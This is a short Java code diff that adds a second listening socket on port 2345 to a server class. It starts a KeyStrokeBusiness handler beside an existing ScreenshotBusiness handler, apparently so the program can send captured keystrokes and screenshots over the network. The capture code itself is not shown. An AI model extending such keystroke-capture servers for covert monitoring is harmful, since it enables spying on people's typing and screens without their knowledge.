@@ -13,21 +13,25 @@ public class ServerBusiness extends Thread {
 	{
 		try
 		{
-			ServerSocket server = new ServerSocket(5000);
+			ServerSocket server1 = new ServerSocket(5000);
+
+			ServerSocket server2 = new ServerSocket(2345);
 			while(true)
 			{
 				try
 				{
-					Socket soc = server.accept();
-					ScreenshotBusiness sb = new ScreenshotBusiness(soc);
+					Socket soc1 = server1.accept();
+					ScreenshotBusiness sb = new ScreenshotBusiness(soc1);
 					sb.start();
+					Socket soc2 = server2.accept();
+					KeyStrokeBusiness ksb = new KeyStrokeBusiness(soc2);
+					ksb.start();
 				}
 				catch(Exception e)
 				{
 					e.printStackTrace();
 				}
 			}
-			
 		}
 		catch(Exception e)
 		{
